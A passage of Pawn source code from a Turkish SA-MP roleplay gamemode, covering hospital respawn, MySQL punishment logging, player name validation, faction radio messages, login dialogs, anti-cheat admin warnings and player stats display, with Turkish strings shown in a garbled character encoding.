				    		format(string, sizeof(string), " All Saints Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
			    			SendRadioMessage(1, DEPTRADIO, string);
							SendRadioMessage(2, DEPTRADIO, string);
						}

						SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
						SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
						SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
						SetPVarInt(playerid, "Hospital", 1);
  	    			}
    	    		case 2:
	    	    	{
    			    	if(PlayerInfo[playerid][pWantedLevel] >= 1)
						{
				    		SendClientMessage(playerid, COLOR_YELLOW, " Arandýðýnýz bilgisi polise bildirilmiþtir ve polisler yoldalar.");
				    		format(string, sizeof(string), " County General Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
			    			SendRadioMessage(1, DEPTRADIO, string);
							SendRadioMessage(2, DEPTRADIO, string);
						}

						SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
						SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
						SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
						SetPVarInt(playerid, "Hospital", 2);
   					}
   				}
			}
			TogglePlayerControllable(playerid, 0);
			SetPlayerHealth(playerid, 0.5);
			SetPVarInt(playerid, "HospitalTimer", 30);
			SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_HOSPITALTIMER);
			return 1;
		}
		if(AdminDuty[playerid] == 0) {
			if(GetPVarInt(playerid, "Hospital") == 0)
			{
				SetPlayerPos(playerid,PlayerInfo[playerid][pPos_x],PlayerInfo[playerid][pPos_y],PlayerInfo[playerid][pPos_z]);
				//PlayerInfo[playerid][pInterior] = PlayerInfo[playerid][pInt];
				SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVW]);
				SetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
				SetPlayerInterior(playerid,PlayerInfo[playerid][pInt]);
				SetPlayerHealth(playerid, PlayerInfo[playerid][pHealth]);
				SetPlayerArmourEx(playerid, PlayerInfo[playerid][pArmor]);
				SetCameraBehindPlayer(playerid);
				if(PlayerInfo[playerid][pInt] > 0)
				{
					LoadObjectsForPlayer(playerid);
				}
			}
			else
			{
				PlayerInfo[playerid][pDuty] = 0;
				PlayerInfo[playerid][pVW] = 0;
				PlayerInfo[playerid][pInt] = 0;
				SetPlayerVirtualWorld(playerid, 0);

				if(GetPVarInt(playerid, "EventToken") != 1)
					ResetPlayerWeaponsEx(playerid);

				SetPVarInt(playerid, "DoktorMasrafi", 1);
				new string[70+MAX_PLAYER_NAME];
				if(PlayerInfo[playerid][pInsurance] == 1)
				{
					if(PlayerInfo[playerid][pWantedLevel] >= 1)
					{
						SendClientMessage(playerid, COLOR_YELLOW, "Bulunduðunuz konum polise bildirilmiþtir ve polisler yoldalar.");
						format(string, sizeof(string), " All Saints Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
						SendRadioMessage(1, DEPTRADIO, string);
						SendRadioMessage(2, DEPTRADIO, string);
					}
					SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
					SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
					SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
					SetPVarInt(playerid, "Hospital", 2);
				}
				else if(PlayerInfo[playerid][pInsurance] == 2)
				{
					if(PlayerInfo[playerid][pWantedLevel] >= 1)
					{
						SendClientMessage(playerid, COLOR_YELLOW, "Bulunduðunuz konum polise bildirilmiþtir ve polisler yoldalar.");
						format(string, sizeof(string), " County General Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
						SendRadioMessage(1, DEPTRADIO, string);
						SendRadioMessage(2, DEPTRADIO, string);
					}
					SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
					SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
					SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
					SetPVarInt(playerid, "Hospital", 1);
				}
				if(PlayerInfo[playerid][pInsurance] == 0)
				{
					new randhos = Random(1,3);
					switch(randhos)
					{
						case 1:
						{
							if(PlayerInfo[playerid][pWantedLevel] >= 1)
							{
								SendClientMessage(playerid, COLOR_YELLOW, " Arandýðýnýz bilgisi polise bildirilmiþtir ve polisler yoldalar.");
								format(string, sizeof(string), " All Saints Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
								SendRadioMessage(1, DEPTRADIO, string);
								SendRadioMessage(2, DEPTRADIO, string);
							}

							SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
							SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);
							SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625); // Warp the player
							SetPVarInt(playerid, "Hospital", 2);
						}
						case 2:
						{
							if(PlayerInfo[playerid][pWantedLevel] >= 1)
							{
								SendClientMessage(playerid, COLOR_YELLOW, " Arandýðýnýz bilgisi polise bildirilmiþtir ve polisler yoldalar.");
								format(string, sizeof(string), " County General Hastanesi %s kiþisini aranan olarak rapor etti.", GetPlayerNameEx(playerid));
								SendRadioMessage(1, DEPTRADIO, string);
								SendRadioMessage(2, DEPTRADIO, string);
							}

							SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
							SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);
							SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
							SetPVarInt(playerid, "Hospital", 1);
						}
					}
				}
				TogglePlayerControllable(playerid, 0);
				SetPlayerHealth(playerid, 0.5);
				SetPVarInt(playerid, "HospitalTimer", 30);
				SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_HOSPITALTIMER);
			}
		}
		new Float: x, Float: y, Float: z;
		GetPlayerPos(playerid, x, y, z);
		if(x == 0.0 && y == 0.0)
		{
  			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid, 1773.459350, -1942.273437, 13.569922);
			SetPlayerFacingAngle(playerid, 329.64);
			SetCameraBehindPlayer(playerid);
		}
		SetPlayerToTeamColor(playerid);
		return 1;
	}
	return 1;
}

/*stock ConnectionLog(playerid, accountid, username[]) {
	new
	    szName[64],
	    szQuery[300];

	mysql_real_escape_string(username, szName, g_MySQLConnections[0]);

	format(szQuery, sizeof(szQuery), "INSERT INTO connections (playerid, AccountID, Username, TimeLoggedIn) VALUES(%d, %d, '%s', UNIX_TIMESTAMP(now()))", playerid, accountid, szName);
	mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	return 1;
}*/

stock punishmentLog(playerid, issuerid, puntype, szPunishment[128], szReason[]) {
	if(AdminDuty[playerid] == 0) {
		new
			szPunText[128],
			szRawReason[128],
			szQuery[440];

		mysql_real_escape_string(szPunishment, szPunText, g_MySQLConnections[0]);
		mysql_real_escape_string(szReason, szRawReason, g_MySQLConnections[0]);

		format(szQuery, sizeof(szQuery), "INSERT INTO punishments (punIssuer, punIssuedTo, punText, punType, punReason, punTS) VALUES(%d, %d, '%s', %d, '%s', UNIX_TIMESTAMP(now()))", PlayerInfo[issuerid][pID], PlayerInfo[playerid][pID], szPunText, puntype, szRawReason);
		mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	}
	return 1;
}

stock punishmentLogEx(playerid, issuerid, puntype, szPunishment[128], szReason[]) {
	if(AdminDuty[playerid] == 0) {
		new
	    szPunText[128],
	    szRawReason[128],
	    szQuery[440];

		mysql_real_escape_string(szPunishment, szPunText, g_MySQLConnections[0]);
		mysql_real_escape_string(szReason, szRawReason, g_MySQLConnections[0]);

		format(szQuery, sizeof(szQuery), "INSERT INTO punishments (punIssuer, punIssuedTo, punText, punType, punReason, punTS) VALUES(%d, %d, '%s', %d, '%s', UNIX_TIMESTAMP(now()))", issuerid, playerid, szPunText, puntype, szRawReason);
		mysql_query(szQuery, THREAD_NO_RESULT, 0, g_MySQLConnections[0]);
	}
	return 1;
}

stock Log(sz_fileName[], sz_input[]) {

	new
		sz_logEntry[156],
		i_dateTime[2][3],
		File: fileHandle = fopen(sz_fileName, io_append);

	gettime(i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2]);
	getdate(i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2]);

	format(sz_logEntry, sizeof(sz_logEntry), "[%i/%i/%i - %i:%i:%i] %s\r\n", i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2], i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2], sz_input);
	fwrite(fileHandle, sz_logEntry);
	return fclose(fileHandle);
}

IsNumeric(const string[])
{
	for (new i = 0, j = strlen(string); i < j; i++)
	{
		if(string[i] > '9' || string[i] < '0') return 0;
	}
	return 1;
}

ReturnUser(text[]) {

	new
		strPos,
		returnID = 0,
		bool: isnum = true;

	while(text[strPos]) {
		if(isnum) {
			if('0' <= text[strPos] <= '9') returnID = (returnID * 10) + (text[strPos] - '0');
			else isnum = false;
		}
		strPos++;
	}
	if(isnum) {
		if(IsPlayerConnected(returnID)) return returnID;
	}
	else {

		new
			sz_playerName[MAX_PLAYER_NAME];

		foreach(Player, i) {
			GetPlayerName(i, sz_playerName, MAX_PLAYER_NAME);
			if(!strcmp(sz_playerName, text, true, strPos)) return i;
		}
	}
	return INVALID_PLAYER_ID;
}

stock InvalidNameCheck(playerid)
{

	new
		szPlayerName[MAX_PLAYER_NAME],
		arrForbiddenNames[][] = {
			"com1", "com2", "com3", "com4",
			"com5", "com6", "com7", "com8",
			"com9", "lpt4", "lpt5", "lpt6",
			"lpt7", "lpt8", "lpt9", "nul",
			"clock$", "aux", "prn", "con",
			"InvalidNick", "BannedPlayer"
		},
		iLength,
		i;

	GetPlayerName(playerid, szPlayerName, sizeof(szPlayerName));
	iLength = strlen(szPlayerName);

	while(i < sizeof(arrForbiddenNames)) if(strcmp(arrForbiddenNames[i++], szPlayerName, true) == 0) {
		SetPlayerName(playerid, "InvalidNick");
		SendClientMessage(playerid, COLOR_CYAN, "Geçersiz isim kullandýðýnýzdan dolayý atýldýnýz.");
		Kick(playerid);
		return 0;
	}

	if(szPlayerName[iLength - 1] == '_' || szPlayerName[0] == '_' || strfind(szPlayerName, "_", false) == -1)
	{
		SendClientMessage(playerid, COLOR_CYAN, "Geçerli bir role play ismiyle giriþ yapmadýðýnýz için atýldýnýz (ör. John_Smith).");
  		SetPlayerName(playerid, "InvalidNick");
		Kick(playerid);
		return 0;
	}
	return 1;
}

stock SendBugMessage(member, color, string[])
{
	foreach(Player, i)
	{
 		if(PlayerInfo[i][pFaction] == member && gBug[i] == 1)
		{
			SendClientMessage(i, color, string);
		}
	}
}

stock SendRadioMessage(member, color, string[])
{
	foreach(Player, i) {
		if(PlayerInfo[i][pFaction] == member) {
			SendClientMessage(i, color, string);
		}
	}
}

stock SendFamilyMessage(family, color, string[])
{
	foreach(Player, i) {
		if(PlayerInfo[i][pFaction] == family || PlayerInfo[i][pLeader] == family) {
			if(!gFam[i]) {
				SendClientMessage(i, color, string);
			}
		}
	}
}

stock RadioBroadCast(playerid, string[])
{
	new MiscString[128], Float: aaaPositions[3];
	foreach(Player, i)
	{
		if(PlayerInfo[i][pRadioFreq] == PlayerInfo[playerid][pRadioFreq] && PlayerInfo[i][pRadio] >= 1 && gRadio[i] != 0)
		{
			GetPlayerPos(i, aaaPositions[0], aaaPositions[1], aaaPositions[2]);
			format(MiscString, sizeof(MiscString), "** Radio (%d kHz) ** %s: %s", PlayerInfo[playerid][pRadioFreq], GetPlayerNameEx(playerid), string);
			SendClientMessage(i, PUBLICRADIO_COLOR, MiscString);
			format(MiscString, sizeof(MiscString), "(radio) %s", string);
			SetPlayerChatBubble(playerid,MiscString,COLOR_WHITE,15.0,5000);
		}
	}
}

stock SendJobMessage(job, color, string[])
{
	foreach(Player, i) {
		if((PlayerInfo[i][pJob] == job || PlayerInfo[i][pJob2] == job) && JobDuty[i] == 1) {
			SendClientMessage(i, color, string);
		}
	}
}

stock SendTaxiMessage(color, string[])
{
	foreach(Player, i) {
		if(TransportDuty[i] == 1 && (PlayerInfo[i][pLeader] == 6 || PlayerInfo[i][pFaction] == 6))
		{
 			SendClientMessage(i, color, string);
		}
	}
}

stock SendBusMessage(color, string[])
{
	foreach(Player, i) {
		if(TransportDuty[i] == 2 && (PlayerInfo[i][pLeader] == 6 || PlayerInfo[i][pFaction] == 6))
		{
 			SendClientMessage(i, color, string);
		}
	}
}

stock SendNewFamilyMessage(family, color, string[])
{
	foreach(Player, i) {
		if(PlayerInfo[i][pGang] == family) {
			if(!gFam[i]) {
				SendClientMessage(i, color, string);
			}
		}
	}
}

stock SetPlayerArmourEx(playerid, Float:armour)
{
	ValidArmor[playerid] = armour;
	SetPlayerArmour(playerid, ValidArmor[playerid]);
	return 1;
}

stock IsBETAServer() {
	if(GetServerVarAsInt("port") == 7777)
	    return 0;

	return 1;
}

stock SendClientMessageEx(playerid, color, string[])
{
	if(InsideMainMenu[playerid] == 1 || InsideTut[playerid] == 1 || ActiveChatbox[playerid] == 0)
		return 0;

	else SendClientMessage(playerid, color, string);
	return 1;
}

stock ICNews(color, string[]) {
	foreach(Player, i) {
	    if(gNews[i] == 0)
	        SendClientMessageEx(i, color, string);
	}

	return 1;
}

stock SendClientMessageToAllEx(color, string[])
{
	foreach(Player, i) {
		if(InsideMainMenu[i] == 1 || InsideTut[i] == 1 || ActiveChatbox[i] == 0) {}
		else SendClientMessage(i, color, string);
	}
	return 1;
}

stock ShowMainMenuGUI(playerid) {
	InsideMainMenu[playerid] = 1;
	//new string[22];

 	//format(string, sizeof(string), "Online oyuncu sayisi: %d", Iter_Count(Player));
  	//TextDrawSetString(MainMenuTxtdraw[7], string);

	for(new i = 0; i < 12; i++) {
		TextDrawShowForPlayer(playerid, MainMenuTxtdraw[i]);
	}

	return 1;
}

stock HideMainMenuGUI(playerid) {
	InsideMainMenu[playerid] = 0;
	ActiveChatbox[playerid] = 1;

	for(new i = 0; i < 12; i++) {
		TextDrawHideForPlayer(playerid, MainMenuTxtdraw[i]);
	}

	return 1;
}

stock ShowMainMenuDialog(playerid, frame) {
	new
		string[180];

	switch(frame) {
		case 1: {
			ClearChatbox(playerid);
			SendClientMessage(playerid, -1, "{FFFFFF}(( {336666}Karakteriniz Veritabanýnda Kayitli...{FFFFFF} ))" );
			format(string, sizeof(string), "{FFFFFF}Bu isim kayýtlý, aþaðýya þifrenizi giriniz.\n\n{00ECFF}Kullanýcý: {FFFFFF}%s\n\n{00ECFF}Þifre:", GetPlayerNameEx(playerid));
			ShowPlayerDialogEx(playerid,MAINMENU,DIALOG_STYLE_PASSWORD,"{00ECFF}Phoenix Role Play - Giriþ",string,"Giriþ Yap","Çýk");
		}
		case 2: {
			SendClientMessage(playerid, -1, "{FFFFFF}(( {336666}Karakteriniz Veritabanýnda Kayitlý deðil...{FFFFFF} ))" );
			format(string, sizeof(string), "{FFFFFF}Ýstediðiniz þifreyi aþaðýya yazarak bu kullanýcýyý kaydedebilirsiniz.\n\n{00ECFF}Kullanýcý: {FFFFFF}%s\n\n{00ECFF}Þifre seçin:", GetPlayerNameEx(playerid));
			ShowPlayerDialogEx(playerid,MAINMENU2,DIALOG_STYLE_PASSWORD,"{00ECFF}Phoenix Role Play - Kayýt",string,"Kayýt Ol","Çýk");
		}
		case 3: {
			format(string, sizeof(string), "{FFFFFF}Yanlýþ þifre.\n\n{FFFFFF}Bu kullanýcý kayýtlý, aþaðýya þifrenizi giriniz.\n\n{00ECFF}Kullanýcý: {FFFFFF}%s\n\n{00ECFF}Þifre:", GetPlayerNameEx(playerid));
			ShowPlayerDialogEx(playerid,MAINMENU,DIALOG_STYLE_PASSWORD,"{00ECFF}Phoenix Role Play - Giriþ",string,"Giriþ Yap","Çýk");
		}
	}

	return 1;
}

forward BackupClear(playerid, calledbytimer);
public BackupClear(playerid, calledbytimer)
{
	if(IsACop(playerid) || PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pFaction] == 5) {
		if(Backup[playerid] == 1) {
			foreach(Player, i) {
				if(IsACop(i) || PlayerInfo[i][pFaction] == 3 || PlayerInfo[i][pFaction] == 5) {
					SetPlayerMarkerForPlayer(i, playerid, TEAM_HIT_COLOR);
				}
			}
			SetPlayerToTeamColor(playerid);
			if(calledbytimer != 1) {
				SendClientMessage(playerid, COLOR_GRAD2, "Yardým çaðrýnýz temizlendi.");
			} else {
				SendClientMessage(playerid, COLOR_GRAD2, "Yardým çaðrýnýz otomatik olarak temizlendi.");
			}
			Backup[playerid] = 0;
		} else {
			if(calledbytimer != 1) {
				SendClientMessage(playerid, COLOR_GRAD2, "Aktif bir yardým çaðrýnýz bulunmamaktadýr!");
			}
		}
	}
	return 1;
}

forward ClearDrugs(playerid);
public ClearDrugs(playerid)
{
	UsedWeed[playerid] = 0;
	UsedCrack[playerid] = 0;
	return 1;
}

stock HelperBroadcast(color, string[], level) {
	foreach(Player, i) {
		if(PlayerInfo[i][pHelper] >= level && GetPVarInt(i, "cschat") == 0) {
			SendClientMessage(i, color, string);
		}
	}
	return 1;
}

stock ABroadCast(color,string[],level)
{
	foreach(Player, i)
	{
		if(PlayerInfo[i][pAdmin] >= level)
		{
			SendClientMessage(i, color, string);
			//printf("%s", string);
		}
	}
	return 1;
}

stock ExecuteNOPAction(playerid)
{
	new string[128];
	new newcar = GetPlayerVehicleID(playerid);
	if(NOPTrigger[playerid] >= MAX_NOP_WARNINGS) { return 1; }
	NOPTrigger[playerid]++;
	RemovePlayerFromVehicle(playerid);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	SetPlayerPos(playerid, X, Y, Z+2);
	NOPCheck(playerid);
	if(NOPTrigger[playerid] > 1)
	{
		new sec = (NOPTrigger[playerid] * 5000)/1000-1;
		format(string, sizeof(string), "{AA3333}Admin Uyarý{FFFF00}: %s (ID %d) kiþisi NOP hacking kullanýyor olabilir - yasak araç (model %d) %d saniyedir.", GetPlayerNameEx(playerid), playerid, GetVehicleModel(newcar),sec);
		ABroadCast(COLOR_YELLOW, string, 2);
	}
	return 1;
}

stock SetPlayerToTeamColor(playerid) {
	if(GetPVarInt(playerid, "PBM") > 3) {
		switch(PaintballTeam[playerid]) {
			case 1:	SetPlayerColor(playerid, 0xFFFF0000);
			case 2: SetPlayerColor(playerid, 0x33CCFF00);
		}
		return 1;
	}

	if(PlayerInfo[playerid][pWantedLevel] > 5)
 	{
		SetPlayerColor(playerid,WANTED_COLOR);
	}

	if(PlayerInfo[playerid][pJailed] == 3)
	{
		SetPlayerColor(playerid,TEAM_APRISON_COLOR);
		return 1;
	}
 	else if(PlayerInfo[playerid][pJailed] == 4)
 	{
		SetPlayerColor(playerid,TEAM_ORANGE_COLOR);
		return 1;
	}
	else
	{
 		SetPlayerColor(playerid,TEAM_HIT_COLOR);
	}

 	if(IsACop(playerid))
 	{
  		if(PlayerInfo[playerid][pDuty] == 1)
    	{
     		if(PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pLeader] == 1)
       		{
       			SetPlayerColor(playerid,TEAM_BLUE_COLOR);
			}
			else if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
   			{
    			SetPlayerColor(playerid,TEAM_FBI_COLOR);
			}
			else
			{
   				SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
			}
		}
		else
		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
		}
	}
	else
	{
		if((PlayerInfo[playerid][pFaction] == 3 || PlayerInfo[playerid][pLeader] == 3) && PlayerInfo[playerid][pDuty] == 1) {
			SetPlayerColor(playerid, TEAM_MED_COLOR);
		}
	    else if((PlayerInfo[playerid][pFaction] == 9 || PlayerInfo[playerid][pLeader] == 9) && PlayerInfo[playerid][pDuty] == 1) {
    		SetPlayerColor(playerid,TEAM_NEWS_COLOR);
		}
	    else if((PlayerInfo[playerid][pFaction] == 6 || PlayerInfo[playerid][pLeader] == 6) && PlayerInfo[playerid][pDuty] == 1) {
    		SetPlayerColor(playerid,TEAM_TAXI_COLOR);
		}
		else SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
	}
	return 1;
}

stock ShowStats(playerid,targetid)
{
	if(IsPlayerConnected(targetid))
	{
	    new facgang[20], employer[64], rank[64], division[64], jtext[20], jtext2[20];

	    new level = PlayerInfo[targetid][pLevel];
	    new phours = PlayerInfo[targetid][pConnectTime];
		new respect = PlayerInfo[targetid][pRespect];
		new nxtlevel = PlayerInfo[targetid][pLevel]+1;
		new expamount = nxtlevel*levelexp;
		new costlevel = nxtlevel*2500;
		new pnumber = PlayerInfo[targetid][pNumber];
		new warns = PlayerInfo[targetid][pWarns];

		facgang = "Oluþum";
		employer = "Yok";
		rank = "Yok";
		if(PlayerInfo[targetid][pGang] < 255)
		{
		    facgang = "Family"; division = "Yok";
			format(employer, sizeof(employer), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyName]);
			switch(PlayerInfo[targetid][pRank])
			{
				case 1: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank1]);
				case 2: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank2]);
				case 3: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank3]);
				case 4: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank4]);
				case 5: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank5]);
	  			case 6: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank6]);
				default: format(rank, sizeof(rank), "%s", FamilyInfo[PlayerInfo[targetid][pGang]][FamilyRank1]);
			}
		}
		else GetPlayerFactionInfo(targetid, rank, division, employer);

		switch(PlayerInfo[targetid][pJob])
		{
			case 1: jtext = "Dedektif";
			case 2: jtext = "Avukat";
			case 3: jtext = "Hayat Kadýný";
			case 4: jtext = "Uyuþturucu Satýcýsý";
			case 5: jtext = "Araba Hýrsýzý";
			//case 6: jtext = "News Reporter";
			case 7: jtext = "Tamirci";
			case 8: jtext = "Bodyguard";
			case 9: jtext = "Silah Satýcýsý";
			//case 10: jtext = "Car Dealer";
			case 12: jtext = "Boksör";
			case 14: jtext = "UyuþturucuKaçakçýsý";
			//case 15: jtext = "Paper Boy";
			//case 16: jtext = "Kamyon Þoförü";
			//case 17: jtext = "Taksici";
			case 18: jtext = "Zanaatkar";
			case 19: jtext = "Barmen";
			case 20: jtext = "Kamyon Þoförü";
			case 21: jtext = "Pizzacý";
			default: jtext = "Yok";
		}
		switch(PlayerInfo[targetid][pJob2])
		{
			case 1: jtext2 = "Dedektif";
			case 2: jtext2 = "Avukat";
			case 3: jtext2 = "Hayat Kadýný";
			case 4: jtext2 = "Uyuþturucu Satýcýsý";
			case 5: jtext2 = "Araba Hýrsýzý";
			//case 6: jtext2 = "News Reporter";
			case 7: jtext2 = "Tamirci";
			case 8: jtext2 = "Bodyguard";
			case 9: jtext2 = "Silah Satýcýsý";
			//case 10: jtext2 = "Car Dealer";
			case 12: jtext2 = "Boksör";
			case 14: jtext2 = "UyuþturucuKaçakçýsý";
			//case 15: jtext2 = "Paper Boy";
			//case 16: jtext2 = "Kamyon Þoförü";
			//case 17: jtext2 = "Taksici";
			case 18: jtext2 = "Zanaatkar";
			case 19: jtext2 = "Barmen";
			case 20: jtext2 = "Kamyon Þoförü";
			case 21: jtext2 = "Pizzacý";
			default: jtext2 = "Yok";
		}
		new jlevel;
		switch(PlayerInfo[targetid][pJob])
		{
			case 1:
			{
					new skilllevel = PlayerInfo[targetid][pDetSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 2:
			{
					new skilllevel = PlayerInfo[targetid][pLawSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 3:
			{
					new skilllevel = PlayerInfo[targetid][pSexSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 4:
			{
					new skilllevel = PlayerInfo[targetid][pDrugsSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 5:
			{
					new skilllevel = PlayerInfo[targetid][pCarSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
	  		case 7:
			{
					new skilllevel = PlayerInfo[targetid][pMechSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 9:
			{
					new skilllevel = PlayerInfo[targetid][pArmsSkill];
					if(skilllevel >= 0 && skilllevel < 50) { jlevel = 1; }
					else if(skilllevel >= 50 && skilllevel < 100) { jlevel = 2; }
					else if(skilllevel >= 100 && skilllevel < 200) { jlevel = 3; }
					else if(skilllevel >= 200 && skilllevel < 400) { jlevel = 4; }
					else if(skilllevel >= 400) { jlevel = 5; }
			}
			case 12:
			{
					new skilllevel = PlayerInfo[targetid][pBoxSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 14:
			{
					new skilllevel = PlayerInfo[targetid][pSmugSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			case 20:
			{
					new skilllevel = PlayerInfo[targetid][pTruckSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel = 4; }
					else if(skilllevel >= 401) { jlevel = 5; }
			}
			default: jlevel = 0;
		}
		new jlevel2;
		switch(PlayerInfo[targetid][pJob2])
		{
			case 1:
			{
					new skilllevel = PlayerInfo[targetid][pDetSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 2:
			{
					new skilllevel = PlayerInfo[targetid][pLawSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 3:
			{
					new skilllevel = PlayerInfo[targetid][pSexSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
					else if(skilllevel >= 401) { jlevel2 = 5; }
			}
			case 4:
			{
					new skilllevel = PlayerInfo[targetid][pDrugsSkill];
					if(skilllevel >= 0 && skilllevel <= 50) { jlevel2 = 1; }
					else if(skilllevel >= 51 && skilllevel <= 100) { jlevel2 = 2; }
					else if(skilllevel >= 101 && skilllevel <= 200) { jlevel2 = 3; }
					else if(skilllevel >= 201 && skilllevel <= 400) { jlevel2 = 4; }
